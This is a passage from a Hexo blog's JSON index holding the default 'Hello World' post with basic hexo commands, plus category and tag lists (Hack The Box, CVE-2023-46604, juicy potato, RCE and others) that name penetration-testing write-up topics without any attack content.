World","slug":"hello-world","date":"2023-08-17T14:40:04.811Z","updated":"2023-08-17T14:40:04.811Z","comments":true,"path":"hello-world.html","link":"","permalink":"https://bzyfjb.github.io/hello-world.html","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"HTB","slug":"HTB","permalink":"https://bzyfjb.github.io/categories/HTB/"}],"tags":[{"name":"HTB","slug":"HTB","permalink":"https://bzyfjb.github.io/tags/HTB/"},{"name":"activeMQ","slug":"activeMQ","permalink":"https://bzyfjb.github.io/tags/activeMQ/"},{"name":"CVE-2023-46604","slug":"CVE-2023-46604","permalink":"https://bzyfjb.github.io/tags/CVE-2023-46604/"},{"name":"sudo","slug":"sudo","permalink":"https://bzyfjb.github.io/tags/sudo/"},{"name":"nginx","slug":"nginx","permalink":"https://bzyfjb.github.io/tags/nginx/"},{"name":"Windows","slug":"Windows","permalink":"https://bzyfjb.github.io/tags/Windows/"},{"name":"HFS","slug":"HFS","permalink":"https://bzyfjb.github.io/tags/HFS/"},{"name":"MS16032","slug":"MS16032","permalink":"https://bzyfjb.github.io/tags/MS16032/"},{"name":"Sherlock","slug":"Sherlock","permalink":"https://bzyfjb.github.io/tags/Sherlock/"},{"name":"Msf","slug":"Msf","permalink":"https://bzyfjb.github.io/tags/Msf/"},{"name":"nishang","slug":"nishang","permalink":"https://bzyfjb.github.io/tags/nishang/"},{"name":"windows","slug":"windows","permalink":"https://bzyfjb.github.io/tags/windows/"},{"name":"juicy potato","slug":"juicy-potato","permalink":"https://bzyfjb.github.io/tags/juicy-potato/"},{"name":"jenkins","slug":"jenkins","permalink":"https://bzyfjb.github.io/tags/jenkins/"},{"name":"RCE","slug":"RCE","permalink":"https://bzyfjb.github.io/tags/RCE/"}]}